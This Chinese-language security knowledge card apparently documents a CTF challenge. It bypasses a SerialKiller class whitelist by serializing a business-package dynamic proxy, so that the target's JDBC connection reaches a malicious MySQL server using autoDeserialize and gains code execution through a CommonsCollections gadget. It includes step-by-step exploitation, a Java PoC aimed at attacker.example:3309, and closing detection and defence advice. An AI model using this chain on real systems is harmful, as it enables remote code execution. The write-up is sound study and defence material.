---
id: web-java-deser-serialkiller-whitelist-business-proxy-mysql-autodeserialize
title: SerialKiller 白名单只放行 java.lang 与业务包：用业务动态代理触发 DriverManager.getConnection 打 MySQL autoDeserialize
type: scenario
domain: web
path: web/java/deserialization
technique: serialkiller-whitelist-business-proxy-mysql-autodeserialize
aliases:
- SerialKiller 白名单绕过
- 业务动态代理反序列化
- InfoInvocationHandler 链
- MySQL autoDeserialize 业务代理入口
- gdufs a_piece_of_java
tags:
- java
- deserialization
- serialkiller
- whitelist
- dynamic-proxy
- jdbc
- mysql
- autodeserialize
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:42:34+08:00'
  notes: 已对照原文羊城杯2020 a_piece_of_java 全文与图05/06-10核对：serialkiller.conf 白名单 gdufs\..*/java\.lang\..*、/hello Cookie data、InfoInvocationHandler.invoke→checkAllInfo→DatabaseInfo.connect→DriverManager.getConnection、password 注入 autoDeserialize=true&queryInterceptors=ServerStatusDiffInterceptor、恶意 MySQL 3309 返回 CC 载荷，截图确认拿 flag；PoC 与原文一致。affected_versions 原为题目依赖/环境版本（MySQL Connector/J 8.0.19），原文未给受影响区间，已按简报清除。未在本机复跑 PoC。
---

## 一句话结论

反序列化入口使用 SerialKiller 并把白名单收紧到只允许 `java.lang.*` 与业务包（如 `gdufs.*`）时，经典 gadget 全部被拒；但业务包里可序列化的 `InvocationHandler`/业务 bean 本身在白名单中，把“动态代理 + 处理器 + 业务 bean”整体序列化进 Cookie，业务代码对反序列化结果调用 `getAllInfo()` 就会触发处理器 `invoke → checkAllInfo → DriverManager.getConnection()`；把 bean 的 host/port/密码字段拼成恶意 MySQL URL（含 `autoDeserialize=true&queryInterceptors=ServerStatusDiffInterceptor`），恶意 MySQL 服务端在 `SHOW SESSION STATUS` 结果里返回 CommonsCollections 序列化字节，即可 RCE。

## 原理

- **白名单只校验流里的类名**：SerialKiller 继承 `ObjectInputStream` 并重写 `resolveClass`，本例配置 `<whitelist><regexp>gdufs\..*</regexp><regexp>java\.lang\..*</regexp></whitelist>`。`java.lang.reflect.Proxy` 命中 `java.lang.*` 正则，业务包里的 `InfoInvocationHandler`、`DatabaseInfo` 命中 `gdufs.*`，因此这条流整体被放行；CC/CB 等 gadget 类不在白名单内，被直接拒绝。
- **动态代理的反序列化与调用**：`Proxy.newProxyInstance` 生成的代理对象序列化后，流中包含代理类、接口列表和 `InvocationHandler`。业务控制器把反序列化结果强转成业务接口 `Info` 并调用 `getAllInfo()`，JVM 把这次调用分派给处理器的 `invoke(proxy, method, args)`。
- **处理器把调用转成 JDBC 连接**：`InfoInvocationHandler.invoke` 在方法名为 `getAllInfo` 时先调用 `this.info.checkAllInfo()`；`checkAllInfo()` 在 host/port/username/password 非空且连接为 null 时调用 `connect()`，后者用这些字段拼出 `jdbc:mysql://host:port/jdbc?user=...&password=...&connectTimeout=...` 并执行 `DriverManager.getConnection(url)`。
- **MySQL 驱动侧的自动反序列化**：Connector/J 8.x 在 `autoDeserialize=true` 且 `queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor` 时，连接初始化会执行 `SHOW SESSION STATUS`，并把服务端返回列交给 `ResultSetImpl.getObject`；当列被标记为 BLOB 且内容以 `0xACED` 开头时，驱动直接 `new ObjectInputStream(...).readObject()`。服务端由攻击者控制，因此可以在结果里放任意序列化 gadget（原文用 CommonsCollections 链）。
- **为什么白名单会被绕过**：白名单防御假设“被放行的类都是安全的”，但业务包中的类本身携带可达危险 sink 的方法；危险行为发生在业务方法调用阶段，而不是反序列化阶段的 `readObject`/`hashCode`，因此类名白名单无从拦截。这也是“过滤器要按行为/能力而非仅按类名”的典型案例。
- **构造期注意**：`Proxy` 序列化的是接口与处理器，不需要在生成端触发任何业务逻辑；生成端只 `new` 对象并 `writeObject`，触发发生在目标端控制器调用 `getAllInfo()` 时。

## 触发条件

- 反序列化入口使用 SerialKiller（或其他 `resolveClass` 白名单）且白名单包含 `java.lang.*` 与可序列化业务类所在的包。
- 业务代码在反序列化后对结果调用方法（如 `info.getAllInfo()`），或反序列化本身会触发业务对象的可序列化方法。
- 白名单内的业务类存在“可控字段 → `DriverManager.getConnection`”链路（本例 `DatabaseInfo.connect()`），且 host/port/用户名/密码可由流控制。
- 目标使用 MySQL Connector/J 8.x（原文 8.0.19），且 `autoDeserialize` 未被禁用；目标 classpath 有可用 gadget（如 commons-collections）。
- 目标可出网访问攻击者控制的 MySQL 服务端（原文端口 3309）。

## 利用步骤

1. 审计 SerialKiller 配置，确认白名单正则；在允许的包中找 `Serializable` 业务类、`InvocationHandler` 及可触达 `DriverManager.getConnection`/JNDI/文件写入等 sink 的方法。
2. 构造业务 bean（如 `DatabaseInfo`）：`host` 指向攻击者 IP、`port` 指向恶意 MySQL 端口、`username=root`、`password` 追加 `&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`。
3. 构造 `InfoInvocationHandler(bean)`，用业务接口 `Info` 生成动态代理；序列化代理对象并 Base64 编码。
4. 启动恶意 MySQL 服务端：完成握手后响应 `SHOW SESSION STATUS` 等查询，在结果集中返回 CC 链序列化字节（可用 ysoserial 生成）。
5. 把 Base64 放入 Cookie `data` 请求 `/hello`；目标反序列化代理 → 控制器调用 `getAllInfo()` → 处理器 `invoke → checkAllInfo → connect → DriverManager.getConnection`。
6. 驱动连接恶意 MySQL，读到结果集中的序列化对象并 `readObject`，触发 CC 链命令执行。
7. 验证：恶意 MySQL 端观察到连接与查询，目标侧出现命令执行/反弹 shell；失败时检查白名单是否放行 Proxy 与业务类、控制器是否调用业务方法、驱动版本与参数。

## PoC

```java
// 生成端关键构造（省略序列化工具；未在本机复跑）
DatabaseInfo databaseInfo = new DatabaseInfo();
databaseInfo.setHost("attacker.example");
databaseInfo.setPort("3309");
databaseInfo.setUsername("root");
databaseInfo.setPassword("123123&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");

InfoInvocationHandler handler = new InfoInvocationHandler(databaseInfo);
Info info = (Info) Proxy.newProxyInstance(
        databaseInfo.getClass().getClassLoader(),
        databaseInfo.getClass().getInterfaces(),
        handler);

ByteArrayOutputStream baos = new ByteArrayOutputStream();
try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
    oos.writeObject(info);
}
String cookie = Base64.getEncoder().encodeToString(baos.toByteArray());
// 将 cookie 作为 data 发送到 /hello
```

```python
# 恶意 MySQL 服务端：握手后对 SHOW SESSION STATUS 返回结果集，
# 在 BLOB 列中放入 ysoserial CommonsCollections 载荷（结构见原文脚本）
```

## 变体与关联

- [[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]：同一个 MySQL `autoDeserialize` sink；本卡的差异是入口受 SerialKiller 白名单限制，必须借业务包内的代理/bean 才能到达 `DriverManager.getConnection`。
- [[web-java-deser-serialkiller-blacklist-cc7-invoker-rmiconnector-secondary]]：SerialKiller **黑名单**场景的绕过（CC7 + RMIConnector 二次反序列化）；本卡是**白名单**场景，思路相反：用被允许的业务类作为载体。
- [[web-java-deser-vaadin-nestedmethodproperty-getconnection-fake-mysql-file-read]]：另一条“反序列化 → 业务 getConnection → 假 MySQL”的链，sink 换成文件读取。
- [[web-java-deserialization-fake-mysql-server-protocol-greeting-warnings-blob]]、[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]：恶意 MySQL 服务端的协议与结果集构造细节。
- 变体：业务类 sink 可换成 JNDI lookup、文件写入、HTTP 请求等；动态代理可换成直接序列化业务 bean；白名单若放行 commons-collections 的部分类，也可回到常规 gadget。
- 边界：白名单未放行 `Proxy`/业务类时不成立；控制器不调用业务方法或只做类型检查时不触发；驱动禁用 `autoDeserialize` 或目标不出网时链断。

## 检测与防御

- 检测：反序列化流中出现 `java.lang.reflect.Proxy` 与业务包处理器/bean 的组合；业务日志中出现由反序列化对象发起的异常 `DriverManager.getConnection`；出站 MySQL 连接到非常规端口（如 3309）。
- 防御：SerialKiller 白名单之外，对反序列化后的对象做“允许类型 + 允许方法”校验；禁止业务可序列化类持有可直接触达 JDBC/JNDI 的字段与方法；MySQL 驱动禁用 `autoDeserialize`，限制服务端出站数据库连接目标；JEP 290 + 业务层白名单组合。
- 响应：保留 Cookie/序列化流与网络日志，确认恶意 MySQL 服务端是否返回并触发了 gadget，排查同入口其它业务类滥用。
